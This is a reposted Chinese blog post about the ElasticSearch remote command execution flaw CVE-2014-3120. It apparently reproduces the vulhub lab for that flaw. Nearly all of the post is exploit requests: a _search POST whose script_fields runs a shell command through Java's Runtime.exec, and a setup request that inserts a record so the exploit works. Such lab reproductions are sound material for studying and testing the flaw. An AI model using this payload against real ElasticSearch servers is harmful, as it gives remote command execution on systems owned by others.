# ElasticSearch 命令执行漏洞（CVE-2014-3120） - mrhonest - 博客园

> 原文：[https://www.cnblogs.com/mrhonest/p/11349741.html](https://www.cnblogs.com/mrhonest/p/11349741.html)

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
} 
```

![](../Images/23952903b59ef4ed68ec09887b2f1a7a.png)

# 该漏洞需要es中至少存在一条数据，若没有,需要先创建一条数据

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
} 
```

[https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/](https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/)